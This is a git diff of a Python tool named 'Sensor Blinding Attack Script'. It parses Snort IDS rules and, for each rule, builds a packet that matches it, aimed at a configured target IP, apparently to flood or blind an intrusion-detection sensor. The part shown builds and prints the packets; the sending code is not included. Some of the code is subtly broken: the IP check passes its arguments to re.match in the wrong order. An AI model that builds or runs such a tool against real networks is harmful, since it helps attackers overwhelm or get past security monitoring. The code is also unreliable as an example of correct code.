@@ -1,18 +1,22 @@
-import packet_crafter
 import json
 import re
 import socket
 import struct
 import fcntl
-from logger import *
+import os
 
-LOGFILE = "./logs/run.log"
+import packet_crafter
+from logger import *
+import snort_regex
+
+DIRNAME = os.path.dirname(os.path.realpath(__file__))
+LOGFILE = os.path.join(DIRNAME, 'logs', 'run.log')
 LOG_LEVEL = "info"
 CONFIG_NAME = "sensor_blinding_config.json"
-IPV4_REGEX = "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
+IPV4_REGEX = r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
 
 
-def check_config(config: dict):
+def check_config(config: dict) -> int:
     if re.match(config["target_ip"], IPV4_REGEX):
         return -1
     if config["use_interface"] not in socket.if_nameindex()[-1]:
@@ -20,14 +24,16 @@ def check_config(config: dict):
     return 0
 
 
-def parse_config():
+def parse_config() -> tuple:
     try:
         with open(CONFIG_NAME, 'r') as config_file:
-            config = json.load(config_file)['data']['config']
-            data = json.load(config_file)['data']['snort_vars']
-            return config, data
+            config_data = json.load(config_file)['data']
+            config = config_data['config']
+            snort_vars = config_data['snort_vars']
+            rules_filename = config_data['rules_filename']
+            return config, snort_vars, rules_filename
     except Exception as error:
-        return error,
+        return error, None, None
 
 
 def get_mask_from_bits(bits: int) -> str:
@@ -40,7 +46,7 @@ def get_mask_from_bits(bits: int) -> str:
     )
 
 
-def get_host_ifaces() -> list:
+def get_host_ifaces() -> list | int:
     logging.info("Network: Getting list of host network interfaces")
     try:
         host_ifaces = [str(pair[-1]) for pair in socket.if_nameindex()]
@@ -53,7 +59,7 @@ def get_host_ifaces() -> list:
         return -1
 
 
-def get_iface_address(ifname: str) -> str:
+def get_iface_address(ifname: str) -> str | int:
     clog(f"Getting IPv4 of network interface {ifname}", LOG_INFO)
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -88,10 +94,10 @@ def auto_interface():
         return error
 
 
-def initial_dialog():
+def initial_dialog() -> tuple | int:
     clog("Welcome to Sensor Blinding Attack Script (GAFFK)", LOG_INFO)
     clog("Loading config...", LOG_INFO)
-    config, data = parse_config()
+    config, data, rules_filename = parse_config()
     if isinstance(config, Exception):
         clog("An error has occurred while loading config", LOG_ERROR)
         clog(f"Error: {config}", LOG_ERROR)
@@ -107,12 +113,26 @@ def initial_dialog():
         clog("Source interface used for attack is not specified / not valid", LOG_WARN)
         clog("Interface will be chosen automatically", LOG_WARN)
         auto_interface()
+    return config, data, rules_filename
 
 
 def main():
     configure_logging(LOGFILE, LOG_LEVEL)
-    if initial_dialog() == -1:
+    dialog_result = initial_dialog()
+    if dialog_result == -1:
         exit(1)
+    config_data, snort_vars, snort_rules_filename = dialog_result
+    for parsed in snort_regex.snort_rules_parser(filename=snort_rules_filename):
+        print(parsed)
+        if parsed['dst_ip'] == 'any':
+            parsed['dst_ip'] = config_data['target_ip']
+        crafter = packet_crafter.PacketCrafter()
+        crafter.craft(
+            proto=parsed['protocol'],
+            destination_addr=':'.join(map(str, (parsed['dst_ip'], parsed['dst_port']))),
+            flags=parsed['raw']['flags'],
+        )
+        print(crafter.packet)
 
 
 if __name__ == "__main__":
